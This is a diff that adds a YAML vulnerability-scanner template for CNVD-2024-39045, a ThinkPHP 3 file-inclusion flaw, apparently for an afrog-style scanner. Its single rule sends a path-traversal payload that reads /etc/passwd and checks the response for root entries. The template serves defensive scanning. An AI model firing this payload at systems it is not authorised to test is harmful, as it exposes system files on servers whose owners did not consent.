@@ -1,0 +1,19 @@
+id: CNVD-2024-39045
+
+info:
+  name: Thinkphp3 文件包含漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    Thinkphp3 存在文件包含漏洞，可以读取任意文件内容。
+  tags: thinkphp,cnvd,cnvd2024,lfi
+  created: 2024/11/15
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /index.php?m=Home&c=index&a=../../../../../etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
